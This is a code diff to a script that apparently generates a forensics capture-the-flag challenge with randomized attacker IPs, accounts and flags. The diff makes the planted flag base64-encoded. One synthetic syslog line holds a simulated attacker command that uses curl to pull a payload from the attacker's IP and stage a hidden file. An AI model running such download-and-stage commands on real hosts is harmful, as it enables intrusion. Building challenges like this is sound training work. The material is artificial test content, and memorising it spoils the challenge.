@@ -4,6 +4,7 @@ The attacker IP is random, the compromised account is random, and the flag is
 only present in the syslog command log for that account's session.
 """
 
+import base64
 import random
 import sys
 from datetime import datetime, timedelta
@@ -48,8 +49,9 @@ def main() -> None:
         f"{t1.strftime('%b %d %H:%M:%S')} srv-web01 sudo: {victim} : TTY=pts/0 ; PWD=/home/{victim} ; USER=root ; COMMAND=/usr/bin/tail /var/log/nginx/access.log"
     )
     t2 = t0 + timedelta(minutes=57)
+    staged = base64.b64encode(flag.encode()).decode()
     sysl.append(
-        f"{t2.strftime('%b %d %H:%M:%S')} srv-web01 sudo-command: {victim} ran: sh -c 'cd /home/{victim} && curl -s http://{attacker_ip}:8081/stg.bin -O && echo {flag} > .cache/.s && chmod 600 .cache/.s'"
+        f"{t2.strftime('%b %d %H:%M:%S')} srv-web01 sudo-command: {victim} ran: sh -c 'cd /home/{victim} && curl -s http://{attacker_ip}:8081/stg.bin -O && printf %s {staged} | base64 -d > .cache/.s && chmod 600 .cache/.s'"
     )
     sysl.append(
         f"{t2.strftime('%b %d %H:%M:%S')} srv-web01 CRON[3320]: (root) CMD (cd /home/{victim} && ls -la)"
